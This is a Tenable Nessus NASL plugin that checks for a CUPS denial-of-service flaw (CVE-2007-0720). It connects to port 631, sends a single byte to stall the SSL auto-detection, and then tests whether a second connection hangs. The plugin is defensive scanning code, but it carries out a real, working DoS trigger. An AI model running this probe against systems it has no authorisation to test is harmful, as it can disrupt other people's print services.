#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(24901);
  script_version("$Revision: 1.18 $");
  script_cvs_date("$Date: 2016/05/04 18:02:14 $");

  script_cve_id("CVE-2007-0720");
  script_bugtraq_id(23127);
  script_osvdb_id(34072);

  script_name(english:"CUPS Incomplete SSL Negotiation Remote DoS");
  script_summary(english:"Tries to block connections temporarily");

  script_set_attribute(attribute:"synopsis", value:"The remote printer service is prone to a denial of service attack.");
  script_set_attribute(attribute:"description", value:
"The version of CUPS installed on the remote host suffers from a design
flaw involving SSL auto-detection. By establishing a connection to a
port on which the application attempts to auto-detect SSL and sending
a single character, an unauthenticated, remote attacker can leverage
this flaw to cause subsequent connections to hang until the first
connection is closed.");
  script_set_attribute(attribute:"see_also", value:"http://www.cups.org/str.php?L2091+P0+S-2+C0+I0+E0+Q");
  script_set_attribute(attribute:"see_also", value:"http://www.cups.org/newsgroups.php?s25+gcups.announce+v30+T0");
  script_set_attribute(attribute:"see_also", value:"http://lists.apple.com/archives/security-announce/2007/Mar/msg00002.html");
  script_set_attribute(attribute:"see_also", value:"https://bugzilla.redhat.com/bugzilla/show_bug.cgi?id=232243");
  script_set_attribute(attribute:"solution", value:"Upgrade to CUPS version 1.2.7 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2007/03/15");
  script_set_attribute(attribute:"plugin_publication_date", value:"2007/03/27");

  script_set_attribute(attribute:"potential_vulnerability", value:"true");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:apple:cups");
  script_end_attributes();

  script_category(ACT_DENIAL);
  script_family(english:"Misc.");
  script_copyright(english:"This script is Copyright (C) 2007-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_keys("www/cups", "Settings/ParanoidReport");
  script_require_ports("Services/www", 631);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = get_http_port(default:631, embedded: 1);

soc = open_sock_tcp(port, transport:ENCAPS_IP);
if (!soc) exit(1, "Cannot connect to TCP port "+port+".");


# Make sure it looks like CUPS.
#
# nb: there won't be a Server header if ServerTokens is set to "None"
#     so only check if the header is present.
banner = get_http_banner(port:port, exit_on_fail: 1);
if ("Server:" >< banner && "Server: CUPS" >!< banner)
 exit(0, "The web server on port "+port+" is not CUPS.");


# Try to hang it.
send(socket:soc, data:crap(1));


# There's a problem if we can't open another connection.
#
# nb: the patch just enforces a timeout after 10 seconds.
sleep(11);
soc2 = open_sock_tcp(port, transport:ENCAPS_IP);
if (soc2)
{
  req = string(
    "GET / HTTP/1.1\r\n",
    "Host: ", get_host_name(), "\r\n",
    "\r\n"
  );
  send(socket:soc2, data:req);
  res = recv(socket:soc2, length:1024);
  close(soc2);
  if (!res) security_warning(port);
}
close(soc);
